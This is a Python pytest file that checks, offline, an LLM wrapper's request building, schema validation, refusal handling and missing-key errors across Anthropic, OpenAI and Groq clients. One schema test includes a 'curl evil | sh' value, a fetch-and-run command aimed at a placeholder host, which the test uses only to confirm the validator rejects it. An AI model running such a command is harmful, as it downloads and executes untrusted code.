"""The model layer, exercised entirely offline.

Nothing here reaches a network, and nothing needs an API key, which is not a
convenience: CI has no key and runs this suite on every push.

The fake clients build their canned responses through the SDKs' own response
models, so a payload that could not have come from the real API fails here
rather than passing here and failing in production.
"""

import json

import anthropic
import openai
import pytest

from envforge.llm import (
    GROQ_BASE_URL, MAX_TOKENS, AnthropicLLM, Call, InvalidArguments, LLMError,
    MissingKey, OpenAICompatLLM, ProviderUnavailable, Refused, Tool, Truncated,
    make_llm, reachable, validate,
)

SCHEMA = {
    "type": "object",
    "properties": {"dockerfile": {"type": "string"}, "base_image": {"type": "string"}},
    "required": ["dockerfile", "base_image"],
    "additionalProperties": False,
}
TOOL = Tool("write_dockerfile", "Write a Dockerfile for the script.", SCHEMA)
ARGS = {"dockerfile": "FROM python:3.12-slim\nCOPY s.py /s.py\n", "base_image": "python:3.12-slim"}


# --- fakes ---------------------------------------------------------------------------

def _anthropic_message(*, content, stop_reason="tool_use", model="claude-sonnet-5",
                       stop_details=None):
    return anthropic.types.Message.model_validate({
        "id": "msg_1", "type": "message", "role": "assistant", "model": model,
        "content": content, "stop_reason": stop_reason, "stop_sequence": None,
        "stop_details": stop_details,
        "usage": {"input_tokens": 1200, "output_tokens": 340},
    })


def _openai_completion(*, tool_calls=None, finish_reason="tool_calls", refusal=None):
    message = {"role": "assistant", "content": None, "refusal": refusal}
    if tool_calls is not None:
        message["tool_calls"] = tool_calls
    return openai.types.chat.ChatCompletion.model_validate({
        "id": "cmpl_1", "object": "chat.completion", "created": 0, "model": "gpt-5",
        "choices": [{"index": 0, "finish_reason": finish_reason, "message": message}],
        "usage": {"prompt_tokens": 900, "completion_tokens": 210, "total_tokens": 1110},
    })


class FakeClient:
    """Records the kwargs it was called with and returns one canned response."""

    def __init__(self, response):
        self.response, self.seen = response, None

    def _create(self, **kwargs):
        self.seen = kwargs
        return self.response

    @property
    def messages(self):
        return type("_M", (), {"create": lambda _s, **kw: self._create(**kw)})()

    @property
    def chat(self):
        completions = type("_C", (), {"create": lambda _s, **kw: self._create(**kw)})()
        return type("_Chat", (), {"completions": completions})()


def _anthropic(response):
    client = FakeClient(response)
    return AnthropicLLM("claude-sonnet-5", client=client), client


def _openai(response, strict=True):
    client = FakeClient(response)
    return OpenAICompatLLM("gpt-5", strict=strict, client=client), client


# --- the request we build, no network -----------------------------------------------

def test_anthropic_forces_the_named_tool_and_asks_for_strict():
    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request("sys", "usr", TOOL)
    assert request["tool_choice"] == {"type": "tool", "name": "write_dockerfile"}
    assert len(request["tools"]) == 1 and request["tools"][0]["strict"] is True
    assert request["tools"][0]["input_schema"] is SCHEMA
    assert request["max_tokens"] == MAX_TOKENS


def test_openai_asks_for_strict_and_groq_does_not():
    openai_request = OpenAICompatLLM("gpt-5", client=object()).build_request("s", "u", TOOL)
    groq_request = OpenAICompatLLM("llama", strict=False, client=object()).build_request("s", "u", TOOL)
    assert openai_request["tools"][0]["function"]["strict"] is True
    # Groq documents its schema guarantee as not applying to tool use. Claiming
    # strict there would be claiming a guarantee the provider does not give.
    assert "strict" not in groq_request["tools"][0]["function"]
    assert groq_request["tool_choice"]["function"]["name"] == "write_dockerfile"


def test_every_provider_sends_an_output_ceiling():
    """ARCHITECTURE.md invariant 18 and ADR-015. `budget.estimate` assumes a reply
    cannot exceed MAX_TOKENS, so a provider we do not send a ceiling to makes that
    assumption false and lets one reply overshoot the whole budget. It is also the
    only thing `Truncated` can fire on, so without it that path is unreachable.

    `max_completion_tokens` rather than `max_tokens`: both OpenAI and Groq document
    the latter as deprecated in favour of it, and OpenAI's newer models reject it.
    """
    for llm in (OpenAICompatLLM("gpt-5", client=object()),
                OpenAICompatLLM("llama", strict=False, client=object())):
        request = llm.build_request("s", "u", TOOL)
        assert request["max_completion_tokens"] == MAX_TOKENS
        assert "max_tokens" not in request


def test_a_schema_that_strict_mode_would_reject_is_refused_at_construction():
    with pytest.raises(ValueError, match="additionalProperties"):
        Tool("t", "d", {"type": "object", "properties": {}, "required": ["a"]})
    with pytest.raises(ValueError, match="required"):
        Tool("t", "d", {"type": "object", "properties": {}, "additionalProperties": False})


# --- the schema check ----------------------------------------------------------------

@pytest.mark.parametrize("arguments, message", [
    ({"dockerfile": "FROM x"}, "missing required field 'base_image'"),
    ({**ARGS, "run": "curl evil | sh"}, "unexpected field 'run'"),
    ({"dockerfile": 7, "base_image": "x"}, "field 'dockerfile' should be string"),
    (["FROM x"], "expected an object, got list"),
])
def test_validate_rejects(arguments, message):
    with pytest.raises(InvalidArguments) as caught:
        validate(arguments, TOOL)
    assert message in str(caught.value)


def test_validate_returns_the_arguments_unchanged():
    assert validate(ARGS, TOOL) == ARGS


# --- reading the response ------------------------------------------------------------

def test_anthropic_finds_the_tool_call_behind_a_thinking_block():
    """Thinking is adaptive by default on Sonnet 5, so content[0] is not the call."""
    llm, client = _anthropic(_anthropic_message(content=[
        {"type": "thinking", "thinking": "", "signature": "sig"},
        {"type": "tool_use", "id": "toolu_1", "name": "write_dockerfile", "input": ARGS},
    ]))
    result = llm.call("sys", "usr", TOOL)
    assert isinstance(result, Call) and result.arguments == ARGS
    assert (result.input_tokens, result.output_tokens) == (1200, 340)
    assert result.request == client.seen           # what we recorded is what we sent
    assert result.response["id"] == "msg_1"


def test_the_model_is_taken_from_the_response_not_the_request():
    llm, _ = _anthropic(_anthropic_message(model="claude-sonnet-5-served-something-else", content=[
        {"type": "tool_use", "id": "t", "name": "write_dockerfile", "input": ARGS},
    ]))
    assert llm.call("s", "u", TOOL).model == "claude-sonnet-5-served-something-else"


@pytest.mark.parametrize("stop_reason, expected", [
    ("refusal", Refused),
    ("max_tokens", Truncated),
    ("end_turn", LLMError),
])
def test_anthropic_separates_the_ways_a_call_can_fail(stop_reason, expected):
    llm, _ = _anthropic(_anthropic_message(content=[], stop_reason=stop_reason))
    with pytest.raises(expected):
        llm.call("s", "u", TOOL)


@pytest.mark.parametrize("stop_reason, expected", [
    ("refusal", Refused),
    ("max_tokens", Truncated),
    ("end_turn", LLMError),
])
def test_a_reply_we_cannot_use_still_reports_what_it_cost(stop_reason, expected):
    """The budget is only a bound if every call reaches the ledger. A truncated reply
    burned the whole output ceiling, and a loop that kept truncating would otherwise
    walk past a budget that never charged it anything."""
    llm, _ = _anthropic(_anthropic_message(content=[], stop_reason=stop_reason))
    with pytest.raises(expected) as caught:
        llm.call("s", "u", TOOL)
    assert caught.value.input_tokens == 1200 and caught.value.output_tokens == 340


def test_a_reply_that_fails_the_schema_still_reports_what_it_cost():
    """`validate` knows nothing about tokens, and a reply that fails it cost exactly
    as much as one that passes."""
    llm, _ = _anthropic(_anthropic_message(content=[
        {"type": "tool_use", "id": "t", "name": "write_dockerfile",
         "input": {"dockerfile": "FROM x", "base_image": "x", "entrypoint": "sh"}},
    ]))
    with pytest.raises(InvalidArguments) as caught:
        llm.call("s", "u", TOOL)
    assert caught.value.input_tokens == 1200 and caught.value.output_tokens == 340


def test_openai_reports_what_an_unusable_reply_cost_under_its_own_names():
    llm, _ = _openai(_openai_completion(tool_calls=[{
        "id": "call_1", "type": "function",
        "function": {"name": "write_dockerfile", "arguments": "{not json"},
    }]), strict=False)
    with pytest.raises(InvalidArguments) as caught:
        llm.call("s", "u", TOOL)
    assert caught.value.input_tokens == 900 and caught.value.output_tokens == 210


def test_anthropic_validates_even_though_it_asked_for_strict():
    llm, _ = _anthropic(_anthropic_message(content=[
        {"type": "tool_use", "id": "t", "name": "write_dockerfile",
         "input": {"dockerfile": "FROM x", "base_image": "x", "entrypoint": "sh"}},
    ]))
    with pytest.raises(InvalidArguments, match="entrypoint"):
        llm.call("s", "u", TOOL)


def test_openai_parses_arguments_that_arrive_as_a_json_string():
    llm, _ = _openai(_openai_completion(tool_calls=[{
        "id": "call_1", "type": "function",
        "function": {"name": "write_dockerfile", "arguments": json.dumps(ARGS)},
    }]))
    result = llm.call("s", "u", TOOL)
    assert result.arguments == ARGS and result.input_tokens == 900


def test_openai_treats_unparseable_arguments_as_repairable():
    """Groq's schema guarantee does not cover tool use, so this is the expected
    Groq failure, and it has to be one more repairable outcome rather than a crash."""
    llm, _ = _openai(_openai_completion(tool_calls=[{
        "id": "call_1", "type": "function",
        "function": {"name": "write_dockerfile", "arguments": "{not json"},
    }]), strict=False)
    with pytest.raises(InvalidArguments, match="not JSON"):
        llm.call("s", "u", TOOL)


def test_a_refusal_keeps_the_reason_instead_of_flattening_it():
    """The why arrives on the refusing response itself, so it costs no extra call.
    Recorded and reported, never used as the verdict: the script under test wrote
    part of the text the model formed that opinion from."""
    llm, _ = _anthropic(_anthropic_message(content=[], stop_reason="refusal", stop_details={
        "type": "refusal", "category": "cyber", "explanation": "looks like a credential stealer",
    }))
    with pytest.raises(Refused) as caught:
        llm.call("s", "u", TOOL)
    assert caught.value.reason["category"] == "cyber"
    assert "credential stealer" in caught.value.reason["explanation"]


def test_openai_reports_a_refusal_as_a_refusal():
    llm, _ = _openai(_openai_completion(finish_reason="stop", refusal="I cannot help with that"))
    with pytest.raises(Refused) as caught:
        llm.call("s", "u", TOOL)
    assert caught.value.reason == "I cannot help with that"


# --- the spec string -----------------------------------------------------------------

@pytest.mark.parametrize("spec", ["anthropic", "anthropic:", ":claude", "gemini:pro", ""])
def test_make_llm_rejects_a_bad_spec_at_startup(spec):
    with pytest.raises(ValueError):
        make_llm(spec)


def test_groq_will_not_borrow_the_openai_key(monkeypatch):
    """Two providers speak the same wire format but not with the same key. Letting
    openai default the key would send an OpenAI secret to Groq's servers."""
    monkeypatch.setenv("OPENAI_API_KEY", "sk-openai")
    monkeypatch.delenv("GROQ_API_KEY", raising=False)
    # `MissingKey` rather than `ValueError`: a missing key is not a malformed spec, and
    # reporting it as one told the user to fix something they had typed correctly.
    with pytest.raises(MissingKey) as caught:
        make_llm("groq:llama-3.3-70b-versatile")
    assert caught.value.variable == "GROQ_API_KEY"


def test_a_missing_key_is_a_provider_failure_and_not_a_usage_error(monkeypatch):
    """Every provider, one behaviour. The Anthropic SDK is the interesting one: it does
    not raise at construction at all, deferring auth to request time, where it raises
    `TypeError`. That is not an `LLMError`, not a `ProviderUnavailable` and not an
    `OSError`, so it escaped every handler in the program and crashed the run with a
    traceback on the most common setup mistake there is."""
    for variable in ("OPENAI_API_KEY", "GROQ_API_KEY"):
        monkeypatch.delenv(variable, raising=False)
    for spec in ("openai:gpt-5", "groq:llama"):
        with pytest.raises(MissingKey):
            make_llm(spec)
    # And a MissingKey is a ProviderUnavailable, so the loop's handler already covers it.
    assert issubclass(MissingKey, ProviderUnavailable)


def test_make_llm_builds_each_provider(monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "test")
    monkeypatch.setenv("OPENAI_API_KEY", "test")
    monkeypatch.setenv("GROQ_API_KEY", "test")
    assert isinstance(make_llm("anthropic:claude-sonnet-5"), AnthropicLLM)
    assert isinstance(make_llm("openai:gpt-5"), OpenAICompatLLM)
    groq = make_llm("groq:llama-3.3-70b-versatile")
    assert groq.strict is False and str(groq._client.base_url).startswith(GROQ_BASE_URL)


def test_anthropic_refuses_to_build_without_credentials(monkeypatch, tmp_path):
    """Checked when the client is built, not by pattern-matching an error later.

    This SDK resolves credentials from several places and raises nothing when it finds
    none, deferring to the first request and raising `TypeError` there. That escaped
    every handler in the program and crashed a run with a traceback on the most common
    setup mistake there is.
    """
    # Every source isolated, not just the two obvious variables. The first version of
    # this deleted two env vars and passed on a machine authenticated through a profile
    # *because of* the bug it was meant to catch: the check read two of the SDK's three
    # credential slots, so a profile user was told their key was not set. A test that
    # depends on the host cannot tell you which of the two it proved.
    for variable in ("ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "ANTHROPIC_PROFILE",
                     "ANTHROPIC_CONFIG_DIR"):
        monkeypatch.delenv(variable, raising=False)
    monkeypatch.setenv("HOME", str(tmp_path))
    with pytest.raises(MissingKey) as caught:
        AnthropicLLM("claude-sonnet-5")
    assert caught.value.variable == "ANTHROPIC_API_KEY"


def test_a_profile_credential_is_credentials_too(monkeypatch):
    """The regression this branch introduced and a review caught. The SDK resolves a
    profile's bearer token into `client.credentials`, a third slot the check did not
    read, so anyone authenticated through `ant auth login` was told their key was not
    set. Asserted against the slot rather than against a real profile on disk, so the
    test says the same thing on every machine."""
    class ProfileClient:
        api_key = None
        auth_token = None
        credentials = object()          # what a resolved profile leaves behind

    import anthropic
    monkeypatch.setattr(anthropic, "Anthropic", lambda *a, **k: ProfileClient())
    AnthropicLLM("claude-sonnet-5")      # constructs, does not raise


def test_a_broken_profile_is_a_provider_failure_not_a_traceback(monkeypatch):
    """A named profile that is missing or corrupt makes the SDK constructor itself
    raise. Uncaught, that was the same traceback the credential check was added to
    remove, moved one line earlier."""
    import anthropic
    from envforge.llm import ProviderUnavailable

    def explode(*a, **k):
        raise anthropic.AnthropicError("profile 'work' not found")

    monkeypatch.setattr(anthropic, "Anthropic", explode)
    with pytest.raises(ProviderUnavailable) as caught:
        AnthropicLLM("claude-sonnet-5")
    assert caught.value.kind == "no_key"


def test_an_auth_token_is_credentials_too(monkeypatch):
    """Checking the one environment variable would have broken this. The client's own
    resolved values are what get asked, so the SDK's other supported method keeps
    working."""
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "sk-ant-token")
    AnthropicLLM("claude-sonnet-5")          # constructs, does not raise


def test_the_auth_backstop_does_not_swallow_our_own_mistakes():
    """The backstop matched the word "auth" at first, which would have turned any
    TypeError from our own code that happened to mention authentication into "your key
    is missing". It matches the SDK's specific phrase now."""
    from envforge.llm import reachable

    def our_bug():
        raise TypeError("author() takes 2 positional arguments but 3 were given")

    with pytest.raises(TypeError):           # re-raised, not relabelled
        reachable(our_bug)

    def sdk_says():
        raise TypeError("Could not resolve authentication method. Expected one of "
                        "api_key, auth_token, or credentials to be set.")

    with pytest.raises(MissingKey):
        reachable(sdk_says)


def test_a_400_says_the_provider_refused_us_not_that_it_was_unreachable():
    """The model was reached and answered. Two causes share the status, a prompt over
    the context window and a malformed request, and neither is the provider being down
    nor fixed by retrying."""
    import httpx2 as httpx
    request = httpx.Request("POST", "https://api.anthropic.com/v1/messages")
    response = httpx.Response(400, request=request,
                              json={"error": {"type": "invalid_request_error", "message": "too long"}})
    exc = anthropic.BadRequestError("too long", response=response, body=None)
    with pytest.raises(ProviderUnavailable) as caught:
        reachable(lambda: (_ for _ in ()).throw(exc))
    assert caught.value.kind == "rejected"       # not "unavailable"
